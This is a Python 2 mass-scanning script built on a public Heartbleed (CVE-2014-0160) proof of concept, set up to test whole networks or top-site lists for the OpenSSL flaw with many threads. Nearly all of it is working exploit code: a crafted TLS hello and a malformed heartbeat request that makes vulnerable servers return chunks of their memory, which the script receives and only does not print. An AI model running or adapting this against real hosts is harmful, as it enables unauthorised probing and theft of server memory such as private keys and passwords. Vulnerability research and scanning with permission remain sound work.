#!/usr/bin/env python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Quickly and dirtily modified by Mustafa Al-Bassam (mus@musalbas.com) to test
# the Alexa top X.

# Usage example: python ssltest.py top-1m.csv 10

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
import netaddr
from collections import defaultdict
from multiprocessing.dummy import Pool

options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains')
options.add_option('--input', '-i', dest="input_file", default=[], action="append", help="Optional input file of networks or ip addresses, one address per line")
options.add_option('--logfile', '-o', dest="log_file", default="results.txt", help="Optional logfile destination")
options.add_option('--resume', dest="resume", action="store_true", default=False, help="Do not rescan hosts that are already in the logfile")
options.add_option('--timeout', '-t', dest="timeout", default=2, help="How long to wait for remote host to respond before timing out")
options.add_option('--threads', dest="threads", default=100, help="If specific, run X concurrent threads")
opts, args = options.parse_args()


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')


def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in lin)
        #print '  %04x: %-48s %s' % (b, hxdat, pdat)
    #print


def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        #print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        #print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay


def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            #print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            #print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 3:
                #print 'WARNING: server returned more data than it should - server is vulnerable!'
                return True
            else:
                #print 'Server processed malformed heartbeat, but did not return any extra data.'
                return False

        if typ == 21:
            #print 'Received alert:'
            hexdump(pay)
            #print 'Server returned error, likely not vulnerable'
            return False


def is_vulnerable(host, timeout):
    """ Check if remote host is vulnerable to heartbleed

     Returns:
        None  -- If remote host has no ssl
        False -- Remote host has ssl but likely not vulnerable
        True  -- Remote host might be vulnerable
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(int(timeout))
    try:
        s.connect((host, 443))
    except Exception, e:
        return None
    s.send(hello)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            #print 'Server closed connection without sending Server Hello.'
            return None
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    s.send(hb)
    return hit_hb(s)

hosts_to_skip = []
counter = defaultdict(int)
import threading
lock = threading.Lock()


def store_results(host, status):
    current_time = time.time()
    with lock:
        counter[status] += 1
        with open(opts.log_file, 'a') as f:
            message = "{current_time} {host} {status}".format(**locals())
            f.write(message + "\n")
            return message


def scan_host(host):
    """ Scans a single host, logs into

    Returns:
        list(timestamp, ipaddress, vulnerabilitystatus)
    """
    host = str(host)
    if host in hosts_to_skip:
        return
    result = is_vulnerable(host, opts.timeout)
    message = store_results(host, result)
    print message


def scan_hostlist(hostlist, threads=5):
    """ Iterates through hostlist and scans them

    Arguments:
        hostlist    -- Iterable with ip addresses
        threads     -- If specified, run in multithreading mode
    """
    threads = int(threads)
    p = Pool(processes=threads)
    p.map(scan_host, hostlist)


def clean_hostlist(args):
    """ Returns list of iterables
    Examples:
    >>> hostlist = ["127.0.0.1", "127.0.0.2"]
    >>> clean_hostlist(hostlist)
    """
    hosts = []
    networks = []
    for i in args:
        # If arg contains a / we assume its a network name
        if '/' in i:
            networks.append(netaddr.IPNetwork(i))
        # If it contains any alphanumerics, it might be a domain name
        elif any(c.isalpha() for c in i):
            hosts.append(socket.gethostbyname(i))
        else:
            hosts.append(i)
    result = []
    for i in networks:
        result.append(i)
    if hosts:
        result.append(hosts)
    return result


def main():
    if not args and not opts.input_file:
        options.print_help()
        return

    # If --resuem specified, find a list of hosts that we will skip
    if opts.resume:
        if not opts.log_file:
            options.error("You need to provide -l with --resume")
        # Open the logfile, add all hosts there into hosts_to_skip
        with open(opts.log_file) as f:
            for line in f:
                tmp = line.split()
                host = tmp[1]
                if len(tmp) != 3:
                    continue
                if host not in hosts_to_skip:
                    hosts_to_skip.append(host)
        print "Skipping %s hosts" % (len(hosts_to_skip), )


    # If any input files were provided, parse through them and add all addresses to "args"
    for input_file in opts.input_file:
        with open(input_file) as f:
            hostlist = []
            for line in f:
                words = line.split()
                if not words:
                    continue
                if line.startswith("Discovered open port"):
                    hostlist.append(words.pop())
                elif len(words) == 1:
                    hostlist.append(words[0])
                else:
                    print "Skipping invalid input line: " % line
                    continue
            args.append(hostlist)

    # For every network in args, convert it to a netaddr network, so we can iterate through each host
    remote_networks = clean_hostlist(args)
    for network in remote_networks:
        scan_hostlist(network, threads=opts.threads)


    print "No SSL: " + str(counter[None])
    print "Vulnerable: " + str(counter[True])
    print "Not vulnerable: " + str(counter[False])

if __name__ == '__main__':
    main()
